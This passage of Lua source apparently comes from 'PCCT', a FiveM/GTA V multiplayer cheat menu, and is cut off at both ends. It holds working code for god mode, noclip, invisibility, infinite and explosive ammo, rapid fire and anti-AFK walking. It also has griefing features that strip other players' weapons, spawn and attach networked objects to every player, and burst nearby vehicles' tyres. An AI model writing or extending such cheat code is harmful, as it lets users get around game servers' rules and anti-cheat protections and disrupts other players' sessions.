                    give_asking_category = false

                    selected_give_opt = 1

                else

                    local weapon = options[cur_opt]

                    self:AddNotification("INFO", "Removed " .. ("<font color='#%s'>%s</font>"):format(self.TertiaryHex, weapon))

                    self:GetFunction("RemoveWeaponFromPed")(self.TakingWeaponFrom, self:GetFunction("GetHashKey")(weapon))

                end

            end



            self.Painter:DrawRect(self:ScrW() - 360 - 21 - offX, 20, 360, sY + 8, 0, 0, 0, 200)

            self.Painter:DrawRect(self:ScrW() - 360 - 21 - offX, 49, 360, 2, self.Config.Tertiary[1], self.Config.Tertiary[2], self.Config.Tertiary[3], 255)

        end

    end



    function PCCT:DoSpawnObjectUI(ped, all)

        if ped or all then

            self.SpawnObjectOn = all and "all" or ped

            was_showing_give = self.Showing

            self.Showing = false

            _no_combat = true

            selected_give_opt = 1

        end



        if self.SpawnObjectOn then

            if self.SpawnObjectOn ~= "all" and not self:GetFunction("DoesEntityExist")(self.SpawnObjectOn) then

                self.SpawnObjectOn = nil

                self.Showing = was_showing_give

                _no_combat = false



                return

            end



            if self.Showing then return end

            if self.GivingWeaponTo then return end

            if self.TakingWeaponFrom then return end



            if self.Config.ShowNotifications and notif_alpha > 0 then

                offX = _lerp(0.1, offX, 429)

            else

                offX = _lerp(0.1, offX, 0)

            end



            local sY = 30

            local max_opts = 30

            local cur_opt = selected_give_opt

            local options = self.FreeCam.SpawnerOptions["OBJECT"]

            local count = 0

            local total_opts = (#options or 0)

            local can_see = true

            self.Painter:DrawText("[" .. ("<font color='#%s'>%s</font>"):format(self.TertiaryHex, self.Name) .. "] Spawn Object (" .. cur_opt .. "/" .. total_opts .. ")", 4, false, self:ScrW() - 360 - 21 - offX, 21, 0.35, 255, 255, 255, 255)



            for id, val in picho.pairs(options or {}) do

                if total_opts > max_opts then

                    can_see = cur_opt - 10 <= id and cur_opt + 10 >= id

                else

                    count = 0

                end



                if can_see and count <= 10 then

                    local r, g, b = 255, 255, 255



                    if cur_opt == id then

                        r, g, b = self.Config.Tertiary[1], self.Config.Tertiary[2], self.Config.Tertiary[3]

                    end



                    self.Painter:DrawText(val, 4, false, self:ScrW() - 360 - 21 - offX, 21 + sY, 0.35, r, g, b, 255)

                    sY = sY + 20

                    count = count + 1

                end

            end



            if self:GetFunction("IsDisabledControlJustPressed")(0, self.Keys["DOWN"]) and not self.Showing then

                local new = selected_give_opt + 1



                if options[new] then

                    selected_give_opt = new

                else

                    selected_give_opt = 1

                end

            end



            if self:GetFunction("IsDisabledControlJustPressed")(0, self.Keys["UP"]) and not self.Showing then

                local new = selected_give_opt - 1



                if options[new] then

                    selected_give_opt = new

                else

                    selected_give_opt = #options

                end

            end



            if self:GetFunction("IsDisabledControlJustPressed")(0, self.Keys["BACKSPACE"]) and not self.Showing then

                self.Showing = was_showing_give

                self.SpawnObjectOn = nil

                selected_give_opt = 1

                _no_combat = false

            end



            if self:GetFunction("IsDisabledControlJustPressed")(0, self.Keys["ENTER"]) and not self:GetFunction("IsDisabledControlJustPressed")(0, self.Keys["MOUSE1"]) and not self:GetFunction("IsDisabledControlJustPressed")(0, self.Keys["SPACE"]) and not self.Showing then

                local object = options[cur_opt]



                if self:RequestModelSync(object) then

                    local should_attach = self:GetFunction("IsDisabledControlPressed")(0, self.Keys["LEFTSHIFT"])

                    self:AddNotification("INFO", should_attach and ("Attached " .. ("<font color='#%s'>%s</font>"):format(self.TertiaryHex, object)) or ("Spawned " .. ("<font color='#%s'>%s</font>"):format(self.TertiaryHex, object)))

                    local on_all = self.SpawnObjectOn == "all"



                    if on_all then

                        for id, src in picho.pairs(self.PlayerCache) do

                            src = picho.tonumber(src)



                            if src ~= self.NetworkID or self.Config.OnlineIncludeSelf then

                                local where = self:GetFunction("GetOffsetFromEntityInWorldCoords")(self:GetFunction("GetPlayerPed")(src), 0.0, 0.0, 0.0)

                                local obj = self:GetFunction("CreateObject")(self:GetFunction("GetHashKey")(object), where.x, where.y, where.z, true, true, true)

                                self:DoNetwork(obj)



                                if should_attach then

                                    self:GetFunction("AttachEntityToEntity")(obj, self:GetFunction("GetPlayerPed")(src), 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, false, true, true, true, 1, false)

                                end



                                Wait(50)

                            end

                        end

                    else

                        local where = self:GetFunction("GetOffsetFromEntityInWorldCoords")(self.SpawnObjectOn, 0.0, 0.0, 0.0)

                        local obj = self:GetFunction("CreateObject")(self:GetFunction("GetHashKey")(object), where.x, where.y, where.z, true, true, true)

                        self:DoNetwork(obj)



                        if should_attach then

                            self:GetFunction("AttachEntityToEntity")(obj, self.SpawnObjectOn, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, false, true, true, true, 1, false)

                        end



                        Wait(50)

                    end

                end

            end



            self.Painter:DrawRect(self:ScrW() - 360 - 21 - offX, 20, 360, sY + 8, 0, 0, 0, 200)

            self.Painter:DrawRect(self:ScrW() - 360 - 21 - offX, 49, 360, 2, self.Config.Tertiary[1], self.Config.Tertiary[2], self.Config.Tertiary[3], 255)

        end

    end



    function PCCT:DoCrosshair()

        if not self.Config.Player.CrossHair then return end

        if self.FreeCam.On then return end

        self.Painter:DrawText("+", 7, true, self:ScrW() / 2, self:ScrH() / 2 - 14, 0.4, self.Config.Tertiary[1], self.Config.Tertiary[2], self.Config.Tertiary[3], 255)

    end



    function PCCT:IsWaypointValid()

        local waypoint = self:GetFunction("GetFirstBlipInfoId")(8)



        return DoesBlipExist(waypoint)

    end



    function PCCT:GetWaypointCoords()

        local waypoint = self:GetFunction("GetFirstBlipInfoId")(8)

        if not DoesBlipExist(waypoint) then return end

        local coords = self:GetFunction("GetBlipInfoIdCoord")(waypoint)



        return coords

    end



    local should_pop = {}



    local wheel_index = {

        {

            bone = "wheel_lf",

            index = 0

        },

        {

            bone = "wheel_rf",

            index = 1

        },

        {

            bone = "wheel_lm",

            index = 2

        },

        {

            bone = "wheel_rm",

            index = 3

        },

        {

            bone = "wheel_lr",

            index = 4

        },

        {

            bone = "wheel_rr",

            index = 5

        }

    }



    function PCCT:PopTires()

        for id, spike in picho.pairs(picho.spike_ents) do

            if not self:GetFunction("DoesEntityExist")(spike) then

                picho.table.remove(picho.spike_ents, id)

            else

                for veh in self:EnumerateVehicles() do

                    local overall_dist = self:GetFunction("GetDistanceBetweenCoords")(self:GetFunction("GetOffsetFromEntityInWorldCoords")(veh, 0.0, 0.0, 0.0), self:GetFunction("GetOffsetFromEntityInWorldCoords")(spike, 0.0, 0.0, 0.0), true)



                    if overall_dist <= 20.0 then

                        for indx = 1, #wheel_index do

                            local t_pos = self:GetFunction("GetWorldPositionOfEntityBone")(veh, self:GetFunction("GetEntityBoneIndexByName")(veh, wheel_index[indx].bone))

                            local s_pos = self:GetFunction("GetOffsetFromEntityInWorldCoords")(spike, 0.0, 0.0, 0.0)

                            local dist = self:GetFunction("GetDistanceBetweenCoords")(t_pos.x, t_pos.y, t_pos.z, s_pos.x, s_pos.y, s_pos.z, true)



                            if dist <= 2.0 and (not self:GetFunction("IsVehicleTyreBurst")(veh, wheel_index[indx].index, true) and not self:GetFunction("IsVehicleTyreBurst")(veh, wheel_index[indx].index, false)) then

                                should_pop[veh] = should_pop[veh] or {}

                                should_pop[veh][indx] = true

                            end

                        end

                    end

                end

            end

        end



        for veh, dat in picho.pairs(should_pop) do

            for indx, _ in picho.pairs(dat) do

                if not self:GetFunction("DoesEntityExist")(veh) then

                    should_pop[veh] = nil

                    break

                end



                if self:RequestControlSync(veh) then

                    self:GetFunction("SetVehicleTyreBurst")(veh, wheel_index[indx].index, false, 1000.0)

                    dat[indx] = nil

                end

            end

        end

    end



    function PCCT:DoNoclip()

        self:GetFunction("SetPedCanRagdoll")(self.LocalPlayer, false)

        self:GetFunction("ResetPedRagdollTimer")(self.LocalPlayer, false)

        self:GetFunction("SetPedConfigFlag")(self.LocalPlayer, 60, true)

        self:GetFunction("SetPedConfigFlag")(self.LocalPlayer, 61, true)

        self:GetFunction("SetPedConfigFlag")(self.LocalPlayer, 104, true)

        self:GetFunction("SetPedConfigFlag")(self.LocalPlayer, 276, true)

        self:GetFunction("SetPedConfigFlag")(self.LocalPlayer, 76, false)

        local velocity = picho.vector_origin

        local forward = self:GetFunction("GetEntityForwardVector")(self.LocalPlayer)

        local up = vector3(0, 0, 1)

        local speed = 100.0



        if PCCT:GetFunction("IsDisabledControlPressed")(0, PCCT.Keys["LEFTCTRL"]) then

            speed = 50.0

        elseif PCCT:GetFunction("IsDisabledControlPressed")(0, PCCT.Keys["LEFTSHIFT"]) then

            speed = 200.0

        end



        if PCCT:GetFunction("IsDisabledControlPressed")(0, PCCT.Keys["W"]) then

            velocity = velocity + forward * speed

        end



        if PCCT:GetFunction("IsDisabledControlPressed")(0, PCCT.Keys["S"]) then

            velocity = velocity - forward * speed

        end



        if PCCT:GetFunction("IsDisabledControlPressed")(0, PCCT.Keys["SPACE"]) then

            velocity = velocity + up * speed

        end



        if PCCT:GetFunction("IsDisabledControlPressed")(0, PCCT.Keys["X"]) then

            velocity = velocity - up * speed

        end



        self:GetFunction("SetEntityVelocity")(self.LocalPlayer, velocity.x, velocity.y, velocity.z)

    end



    local _was_anti_afk

    local sort_func = function(srcA, srcB) return srcA - srcB end

    local force_reload = {}



    CreateThread(function()

        while PCCT.Enabled do

            Wait(200)



            if not PCCT.Showing and picho.bind_time < PCCT:GetFunction("GetGameTimer")() then

                PCCT:DoBindListener()

            end

        end

    end)



    CreateThread(function()

        while PCCT.Enabled do

            Wait(0)

            PCCT.LocalPlayer = PCCT:GetFunction("PlayerPedId")()

            PCCT.NetworkID = PCCT:GetFunction("PlayerId")()

            PCCT.PlayerCache = PCCT:GetFunction("GetActivePlayers")()

            local w, h = PCCT:GetFunction("GetActiveScreenResolution")()

            PCCT._ScrW = w

            PCCT._ScrH = h



            if w and h and not PCCT.Config.NotifX and not PCCT.Config.NotifY then

                PCCT.Config.NotifX = w - PCCT.Config.NotifW - 20

                PCCT.Config.NotifY = 20

            end



            if not PCCT.Config.NotifW then

                PCCT.Config.NotifW = 420

            end



            if not PCCT:GetFunction("IsPauseMenuActive")() then

                PCCT:Cleanup()

                PCCT:PopTires()

                PCCT:DoESP()

                PCCT:DoGiveWeaponUI()

                PCCT:DoTakeWeaponUI()

                PCCT:DoSpawnObjectUI()

                PCCT:DoLSC()

                PCCT:DoAntiAim()

                PCCT:DoVehicleRelated()

                PCCT:DoBlips()

                PCCT:Tracker()

                PCCT:DoCrosshair()

                local keyboard_open = PCCT:GetFunction("UpdateOnscreenKeyboard")() ~= -1 and PCCT:GetFunction("UpdateOnscreenKeyboard")() ~= 1 and PCCT:GetFunction("UpdateOnscreenKeyboard")() ~= 2



                if not PCCT:GetFunction("HasStreamedTexturepichoLoaded")("commonmenu") then

                    PCCT:GetFunction("RequestStreamedTexturepicho")("commonmenu")

                end



                PCCT:DrawNotifications()



                if walking and not magic_riding then

                    local safe



                    if not PCCT.Showing and PCCT.Config.UseAutoWalk and not (PCCT.Config.UseAutoWalkAlt and (PCCT.FreeCam.On or PCCT.RCCar.CamOn)) then

                        safe = true

                    elseif not PCCT.Config.UseAutoWalk and not (PCCT.Config.UseAutoWalkAlt and (PCCT.FreeCam.On or PCCT.RCCar.CamOn)) then

                        safe = true

                    elseif not PCCT.Config.UseAutoWalkAlt and (PCCT.FreeCam.On or PCCT.RCCar.CamOn) then

                        safe = true

                    end



                    if not PCCT.Config.Player.AntiAFK and _was_anti_afk then

                        safe = true

                    end



                    if PCCT.Config.Player.MoveToWaypoint and picho.moving_wp then

                        safe = false

                    end



                    if PCCT.Config.Player.AntiAFK then

                        safe = false

                    end



                    if safe then

                        PCCT:GetFunction("ClearPedTasks")(PCCT.LocalPlayer)

                        walking = false

                    end

                end



                if not walking and not magic_riding then

                    local safe



                    if PCCT.Showing and PCCT.Config.UseAutoWalk and not (PCCT.RCCar.CamOn or PCCT.FreeCam.On) then

                        safe = true

                    elseif PCCT.Config.UseAutoWalkAlt and (PCCT.RCCar.CamOn or PCCT.FreeCam.On) then

                        safe = true

                    end



                    if was_fakedead or fakedead_timer >= PCCT:GetFunction("GetGameTimer")() then

                        safe = false

                        PCCT:GetFunction("ClearPedTasks")(PCCT.LocalPlayer)

                    end



                    if PCCT.Config.Player.MoveToWaypoint and picho.moving_wp then

                        safe = false

                    end



                    if PCCT.Config.Player.AntiAFK then

                        safe = true

                    end



                    if safe then

                        walking = true

                        local veh = PCCT:GetFunction("GetVehiclePedIsIn")(PCCT.LocalPlayer)



                        if PCCT:GetFunction("DoesEntityExist")(veh) then

                            PCCT:GetFunction("TaskVehicleDriveWander")(PCCT.LocalPlayer, veh, 40.0, 262847)

                        else

                            PCCT:GetFunction("TaskWanderStandard")(PCCT.LocalPlayer, 10.0, 10)

                        end

                    end

                end



                if not PCCT.FreeCam.On and not PCCT.SpectatingPlayer and not PCCT.RCCar.CamOn and not PCCT.Config.DisableMovement then

                    PCCT:GetFunction("EnableAllControlActions")(0)

                elseif not PCCT.Config.DisableMovement then

                    PCCT:EnableMouse()

                end



                if PCCT.Showing then

                    local x, y = PCCT:GetFunction("GetNuiCursorPosition")()

                    PCCT._MouseX = x

                    PCCT._MouseY = y



                    if PCCT.Config.DisableMovement and (not PCCT.FreeCam.On and not PCCT.SpectatingPlayer and not PCCT.RCCar.CamOn) then

                        PCCT:GetFunction("DisableAllControlActions")(0)

                    elseif not PCCT.Config.DisableMovement then

                        PCCT.FreeCam:DisableCombat(true)

                    end



                    PCCT:GetFunction("SetMouseCursorActiveThisFrame")()

                    PCCT:GetFunction("SetMouseCursorSprite")(1)

                    PCCT:DrawMenu()



                    if not was_showing then

                        selected_config = "none"

                    end



                    was_showing = true

                elseif was_showing then

                    if walking and not PCCT:GetFunction("IsEntityInAir")(PCCT.LocalPlayer) then

                        PCCT:GetFunction("ClearPedTasks")(PCCT.LocalPlayer)

                        walking = false

                    end



                    was_showing = false

                end



                if PCCT:GetFunction("IsDisabledControlJustPressed")(0, PCCT.Keys[PCCT.Config.ShowKey]) and not keyboard_open then

                    PCCT.Showing = not PCCT.Showing

                end



                if PCCT.Config.FreeCamKey ~= "NONE" and PCCT:GetFunction("IsDisabledControlJustPressed")(0, PCCT.Keys[PCCT.Config.FreeCamKey]) and not keyboard_open and (not PCCT.GivingWeaponTo or not PCCT:GetFunction("DoesEntityExist")(PCCT.GivingWeaponTo)) and (not PCCT.TakingWeaponFrom or not PCCT:GetFunction("DoesEntityExist")(PCCT.TakingWeaponFrom)) then

                    PCCT.RCCar.CamOn = false

                    PCCT.SpectatingPlayer = nil

                    Wait(1)

                    PCCT.FreeCam.On = not PCCT.FreeCam.On

                end



                if PCCT.Config.RCCamKey ~= "NONE" and PCCT:GetFunction("IsDisabledControlJustPressed")(0, PCCT.Keys[PCCT.Config.RCCamKey]) and not keyboard_open and (not PCCT.GivingWeaponTo or not PCCT:GetFunction("DoesEntityExist")(PCCT.GivingWeaponTo)) and (not PCCT.TakingWeaponFrom or not PCCT:GetFunction("DoesEntityExist")(PCCT.TakingWeaponFrom)) then

                    PCCT.FreeCam.On = false

                    PCCT.SpectatingPlayer = nil

                    Wait(1)



                    if PCCT.RCCar.On then

                        PCCT.RCCar.CamOn = not PCCT.RCCar.CamOn

                    else

                        PCCT:AddNotification("ERROR", "Carro RC no!")

                    end

                end



                if PCCT.Config.Player.ForceRadar then

                    PCCT:GetFunction("DisplayRadar")(true)

                end



                if PCCT.Config.Player.FakeDead then

                    PCCT:GetFunction("SetPedToRagdoll")(PCCT.LocalPlayer, 1000, 1000, 0, true, true, false)

                    was_fakedead = true

                elseif was_fakedead then

                    walking = false

                    PCCT:GetFunction("SetPedToRagdoll")(PCCT.LocalPlayer, 1, 1, 0, true, true, false)

                    PCCT:GetFunction("ClearPedTasks")(PCCT.LocalPlayer)

                    was_fakedead = false

                    fakedead_timer = PCCT:GetFunction("GetGameTimer")() + 1500

                end



                if PCCT.Config.Player.SuperJump then

                    PCCT:GetFunction("SetSuperJumpThisFrame")(PCCT.NetworkID)

                end



                if PCCT.Config.Player.MoveToWaypoint then

                    if picho.moving_wp and (not PCCT:IsWaypointValid() or (not PCCT:GetFunction("IsPedInAnyVehicle")(PCCT.LocalPlayer) or PCCT:GetFunction("GetPedInVehicleSeat")(PCCT:GetFunction("GetVehiclePedIsIn")(PCCT.LocalPlayer), -1) ~= PCCT.LocalPlayer)) then

                        PCCT.Config.Player.MoveToWaypoint = false

                        picho.moving_wp = false

                        PCCT:GetFunction("ClearPedTasks")(PCCT.LocalPlayer)

                    else

                        if not picho.moving_wp then

                            local veh = PCCT:GetFunction("GetVehiclePedIsIn")(PCCT.LocalPlayer)

                            local where = PCCT:GetWaypointCoords()



                            if PCCT:GetFunction("DoesEntityExist")(veh) then

                                PCCT:GetFunction("TaskVehicleDriveToCoordLongrange")(PCCT.LocalPlayer, veh, where.x, where.y, 0.0, 40.0, 60, 1.0)

                            end



                            picho.moving_wp = true

                        end

                    end

                end



                if PCCT.Config.Player.Invisibility then

                    PCCT:GetFunction("SetEntityVisible")(PCCT.LocalPlayer, false, false)

                    PCCT:GetFunction("SetEntityLocallyVisible")(PCCT.LocalPlayer, true)

                    PCCT:GetFunction("SetEntityAlpha")(PCCT.LocalPlayer, 150)

                    was_invis = true

                elseif was_invis then

                    PCCT:GetFunction("SetEntityVisible")(PCCT.LocalPlayer, true, true)

                    PCCT:GetFunction("SetEntityAlpha")(PCCT.LocalPlayer, 255)

                    was_invis = false

                end



                PCCT:GetFunction("SetEntityProofs")(PCCT.LocalPlayer, PCCT.Config.Player.God, PCCT.Config.Player.God, PCCT.Config.Player.God, PCCT.Config.Player.God, PCCT.Config.Player.God, PCCT.Config.Player.God, PCCT.Config.Player.God, PCCT.Config.Player.God)



                if PCCT.Config.Player.SemiGod then

                    PCCT:GetFunction("SetEntityHealth")(PCCT.LocalPlayer, 200)

                end



                if PCCT.Config.Player.InfiniteStamina then

                    PCCT:GetFunction("ResetPlayerStamina")(PCCT.NetworkID)

                end



                if PCCT.Config.Player.ThermalVision then

                    PCCT:GetFunction("SetSeethrough")(true)

                    was_thermal = true

                elseif was_thermal then

                    PCCT:GetFunction("SetSeethrough")(false)

                    was_thermal = false

                end



                if PCCT.Config.Player.NoClip then

                    PCCT:DoNoclip()

                    was_noclip = true

                elseif was_noclip then

                    PCCT:GetFunction("SetPedCanRagdoll")(PCCT.LocalPlayer, true)

                    was_noclip = false

                end



                if PCCT.Config.Player.NoRagdoll then

                    PCCT:GetFunction("SetPedCanRagdoll")(PCCT.LocalPlayer, false)

                    was_noragdoll = true

                elseif was_noragdoll then

                    PCCT:GetFunction("SetPedCanRagdoll")(PCCT.LocalPlayer, true)

                    was_noragdoll = false

                end



                if PCCT.Config.Player.BypassBJ then

                    PCCT:GetFunction("SetPedCanRagdoll")(PCCT.LocalPlayer, false)

                    was_BypassBJ = true

                elseif was_BypassBJ then

                    PCCT:GetFunction("SetPedCanRagdoll")(PCCT.LocalPlayer, true)

                    was_BypassBJ = false

                end



                if PCCT.Config.Player.FastRun then

                    PCCT:GetFunction("SetRunSprintMultiplierForPlayer")(PCCT.NetworkID, 1.49)

                    PCCT:GetFunction("SetPedMoveRateOverride")(PCCT.LocalPlayer, 2.0)

                    was_fastrun = true

                elseif was_fastrun then

                    PCCT:GetFunction("SetRunSprintMultiplierForPlayer")(PCCT.NetworkID, 1.0)

                    PCCT:GetFunction("SetPedMoveRateOverride")(PCCT.LocalPlayer, 0.0)

                    was_fastrun = false

                end



                if PCCT.Config.Player.NoReload then

                    local curWep = PCCT:GetFunction("GetSelectedPedWeapon")(PCCT.LocalPlayer)



                    if not force_reload[curWep] then

                        PCCT:GetFunction("PedSkipNextReloading")(PCCT.LocalPlayer)

                    end

                end



                if PCCT.Config.Player.InfiniteAmmo then

                    local curWep = PCCT:GetFunction("GetSelectedPedWeapon")(PCCT.LocalPlayer)

                    local ret, cur_ammo = PCCT:GetFunction("GetAmmoInClip")(PCCT.LocalPlayer, curWep)



                    if ret then

                        local max_ammo = PCCT:GetFunction("GetMaxAmmoInClip")(PCCT.LocalPlayer, curWep, 1)



                        if cur_ammo < max_ammo and max_ammo > 0 then

                            PCCT:GetFunction("SetAmmoInClip")(PCCT.LocalPlayer, curWep, max_ammo)

                        end

                    end



                    local ret, max = PCCT:GetFunction("GetMaxAmmo")(PCCT.LocalPlayer, curWep)



                    if ret then

                        PCCT:GetFunction("SetPedAmmo")(PCCT.LocalPlayer, curWep, max)

                    end

                end



                if PCCT.Config.Player.InfiniteAmmo then

                    local curWep = PCCT:GetFunction("GetSelectedPedWeapon")(PCCT.LocalPlayer)

                    local ret, cur_ammo = PCCT:GetFunction("GetAmmoInClip")(PCCT.LocalPlayer, curWep)



                    if ret then

                        local max_ammo = PCCT:GetFunction("GetMaxAmmoInClip")(PCCT.LocalPlayer, curWep, 1)



                        if cur_ammo < max_ammo and max_ammo > 0 then

                            PCCT:GetFunction("SetAmmoInClip")(PCCT.LocalPlayer, curWep, max_ammo)

                        end

                    end

                end



                if PCCT.Config.Player.RapidFire and IsDisabledControlPressed(0, PCCT.Keys["MOUSE1"]) and not PCCT.Showing and (not PCCT.FreeCam.On and not PCCT.RCCar.CamOn) then

                    local curWep = PCCT:GetFunction("GetSelectedPedWeapon")(PCCT.LocalPlayer)

                    local cur = PCCT:GetFunction("GetOffsetFromEntityInWorldCoords")(PCCT:GetFunction("GetCurrentPedWeaponEntityIndex")(PCCT.LocalPlayer), 0.0, 0.0, 0.0)

                    local _dir = PCCT:GetFunction("GetGameplayCamRot")(0)

                    local dir = rot_to_dir(_dir)

                    local dist = PCCT.Config.Player.NoDrop and 99999.0 or 200.0

                    local len = _multiply(dir, dist)

                    local targ = cur + len

                    PCCT:GetFunction("ShootSingleBulletBetweenCoords")(cur.x, cur.y, cur.z, targ.x, targ.y, targ.z, 5, 1, curWep, PCCT.LocalPlayer, true, true, 24000.0)



                    if PCCT.Config.Player.ExplosiveAmmo then

                        local impact, coords = PCCT:GetFunction("GetPedLastWeaponImpactCoord")(PCCT.LocalPlayer)



                        if impact then

                            PCCT:GetFunction("AddExplosion")(coords.x, coords.y, coords.z, 7, 100000.0, true, false, 0.0)

                        end

                    end

                end



                if not PCCT.Config.Player.RapidFire and PCCT.Config.Player.ExplosiveAmmo then

                    local impact, coords = PCCT:GetFunction("GetPedLastWeaponImpactCoord")(PCCT.LocalPlayer)



                    if impact then

                        PCCT:GetFunction("AddExplosion")(coords.x, coords.y, coords.z, 7, 100000.0, true, false, 0.0)

                    end



                    PCCT:GetFunction("SetExplosiveMeleeThisFrame")(PCCT.NetworkID)

                end



                if PCCT.Config.Player.InfiniteCombatRoll then

                    for i = 0, 3 do

                        PCCT:GetFunction("StatSetInt")(PCCT:GetFunction("GetHashKey")("mp" .. i .. "_shooting_ability"), 9999, true)

                        PCCT:GetFunction("StatSetInt")(PCCT:GetFunction("GetHashKey")("sp" .. i .. "_shooting_ability"), 9999, true)

                    end



                    was_infinite_combat_roll = true

                elseif was_infinite_combat_roll then

                    for i = 0, 3 do

                        PCCT:GetFunction("StatSetInt")(PCCT:GetFunction("GetHashKey")("mp" .. i .. "_shooting_ability"), 0, true)

                        PCCT:GetFunction("StatSetInt")(PCCT:GetFunction("GetHashKey")("sp" .. i .. "_shooting_ability"), 0, true)

                    end

                end



                if PCCT.Config.Player.MagMode then

                    PCCT:DoMagneto()

                end



                PCCT:DoKeyPressed()

            end

        end

    end)



    local _keys = {}



    function PCCT:DoKeyPressed()

        if not self.Config.ShowControlsOnScreen then return end

        local offY = 0

        local count = 0



        for name, control in picho.pairs(self.Keys) do

            if self:GetFunction("IsControlJustPressed")(0, control) or self:GetFunction("IsDisabledControlJustPressed")(0, control) then

                _keys[#_keys + 1] = {

                    str = name .. "[" .. control .. "]",

                    expires = self:GetFunction("GetGameTimer")() + 5000

                }

            end



            count = count + 1

        end



        for _, key in picho.pairs(_keys) do

            local cur = self:GetFunction("GetGameTimer")()

            local left = key.expires - cur



            if left <= 0 then

                picho.table.remove(_keys, _)

            else

                local secs = (left / 1000)

                local alpha = picho.math.ceil(((left / 1000) / 5) * 255) + 50

                alpha = _clamp(alpha, 0, 255)

                offY = offY + 0.024 * _clamp(secs * 4, 0, 1)

                self:ScreenText(key.str, 4, 0.0, 0.8, 1 - offY, 0.3, 255, 255, 255, alpha)

            end

        end

    end



    local function _do_riding()

        if not magic_riding then

            PCCT:GetFunction("ClearPedTasks")(PCCT.LocalPlayer)

            local rot = PCCT:GetFunction("GetEntityRotation")(magic_carpet_obj)

            PCCT:GetFunction("SetEntityRotation")(magic_carpet_obj, 0.0, rot.y, rot.z)

        else

            local coords = PCCT:GetFunction("GetOffsetFromEntityInWorldCoords")(PCCT.LocalPlayer, 0.0, 0.0, 0.0)

            local carpet = PCCT:GetFunction("GetOffsetFromEntityInWorldCoords")(magic_carpet_obj, 0.0, 0.0, 0.0)

            local head = PCCT:GetFunction("GetEntityHeading")(magic_carpet_obj)

            PCCT:GetFunction("SetEntityHeading")(PCCT.LocalPlayer, head)

            PCCT:GetFunction("SetEntityCoords")(PCCT.LocalPlayer, carpet.x, carpet.y, carpet.z, false, false, false, false)

            PCCT:GetFunction("TaskPlayAnim")(PCCT.LocalPlayer, "rcmcollect_paperleadinout@", "meditiate_idle", 2.0, 2.5, -1, 47, 0, 0, 0, 0)

        end

    end



    local function _up_vec()

        local up = vector3(0, 0, 1)



        return up

    end



    local function _do_flying()

        if not magic_riding then return end

        PCCT.FreeCam:DisableMovement(true)



        if not IsEntityPlayingAnim(PCCT.LocalPlayer, "rcmcollect_paperleadinout@", "meditiate_idle", 3) then

            PCCT:GetFunction("TaskPlayAnim")(PCCT.LocalPlayer, "rcmcollect_paperleadinout@", "meditiate_idle", 2.0, 2.5, -1, 47, 0, 0, 0, 0)

        end



        local carpet = PCCT:GetFunction("GetOffsetFromEntityInWorldCoords")(magic_carpet_obj, 0.0, 0.0, 0.0)

        local rot = PCCT:GetFunction("GetGameplayCamRot")(0)



        if not PCCT.FreeCam.On then

            PCCT:GetFunction("SetEntityRotation")(magic_carpet_obj, rot.x + 0.0, rot.y + 0.0, rot.z + 0.0)

            local forwardVec = PCCT:GetFunction("GetEntityForwardVector")(magic_carpet_obj)

            local upVec = _up_vec(magic_carpet_obj)

            local speed = 1.0



            if PCCT:GetFunction("IsDisabledControlPressed")(0, PCCT.Keys["LEFTCTRL"]) then

                speed = 0.1

            elseif PCCT:GetFunction("IsDisabledControlPressed")(0, PCCT.Keys["LEFTSHIFT"]) then

                speed = 1.8

            end



            if PCCT:GetFunction("IsDisabledControlPressed")(0, PCCT.Keys["W"]) then

                carpet = carpet + forwardVec * speed

            end



            if PCCT:GetFunction("IsDisabledControlPressed")(0, PCCT.Keys["S"]) then

                carpet = carpet - forwardVec * speed

            end



            if PCCT:GetFunction("IsDisabledControlPressed")(0, PCCT.Keys["SPACE"]) then

                carpet = carpet + upVec * speed

            end



            if PCCT:GetFunction("IsDisabledControlPressed")(0, PCCT.Keys["X"]) then

                carpet = carpet - upVec * speed

            end



            PCCT:GetFunction("SetEntityCoords")(magic_carpet_obj, carpet.x, carpet.y, carpet.z, false, false, false, false)

        end



        PCCT:GetFunction("SetEntityRotation")(PCCT.LocalPlayer, rot.x, rot.y, rot.z)

        PCCT:GetFunction("AttachEntityToEntity")(PCCT.LocalPlayer, magic_carpet_obj, 0, 0.0, 0.0, 1.0, rot.x, PCCT:GetFunction("GetEntityHeading")(magic_carpet_obj), rot.z, false, false, false, false, 1, false)

    end



    CreateThread(function()

        while PCCT.Enabled do

            Wait(0)



            if _no_combat and not _was_no_combat then

                _was_no_combat = true

            elseif not _no_combat and _was_no_combat then

                _was_no_combat = false

                PCCT.FreeCam:DisableCombat(_no_combat)

            end



            if _no_combat then

                PCCT.FreeCam:DisableCombat(_no_combat)

            end

        end

    end)



    CreateThread(function()

        PCCT:RequestModelSync("apa_mp_h_acc_rugwoolm_03")

        PCCT:GetFunction("RequestAnimpicho")("rcmcollect_paperleadinout@")



        while PCCT.Enabled do

            Wait(0)



            if PCCT.Config.Player.MagicCarpet then

                local our_cam = PCCT:GetFunction("GetRenderingCam")()



                if not magic_carpet_obj or not PCCT:GetFunction("DoesEntityExist")(magic_carpet_obj) then

                    local cur = PCCT:GetFunction("GetGameplayCamCoord")()

                    local _dir = PCCT:GetFunction("GetGameplayCamRot")(0)

                    local dir = rot_to_dir(_dir)

                    local dist = 100.0

                    local len = _multiply(dir, dist)

                    local targ = cur + len

                    local handle = PCCT:GetFunction("StartShapeTestRay")(cur.x, cur.y, cur.z, targ.x, targ.y, targ.z, 1, preview_magic_carpet)

                    local _, hit, hit_pos, _, entity = PCCT:GetFunction("GetShapeTestResult")(handle)



                    if not preview_magic_carpet or not PCCT:GetFunction("DoesEntityExist")(preview_magic_carpet) then

                        _no_combat = true

                        preview_magic_carpet = PCCT:GetFunction("CreateObject")(PCCT:GetFunction("GetHashKey")("apa_mp_h_acc_rugwoolm_03"), hit_pos.x, hit_pos.y, hit_pos.z + 0.5, false, true, true)

                        PCCT:GetFunction("SetEntityCollision")(preview_magic_carpet, false, false)

                        PCCT:GetFunction("SetEntityAlpha")(preview_magic_carpet, 100)

                        Wait(50)

                    elseif hit then

                        PCCT:GetFunction("SetEntityCoords")(preview_magic_carpet, hit_pos.x, hit_pos.y, hit_pos.z + 0.5, false, false, false, false)

                        PCCT:GetFunction("SetEntityAlpha")(preview_magic_carpet, 100)

                        PCCT:GetFunction("FreezeEntityPosition")(preview_magic_carpet, true)

                        PCCT:GetFunction("SetEntityRotation")(preview_magic_carpet, 0.0, 0.0, _dir.z + 0.0)

                        PCCT:GetFunction("SetEntityCollision")(preview_magic_carpet, false, false)

                    end



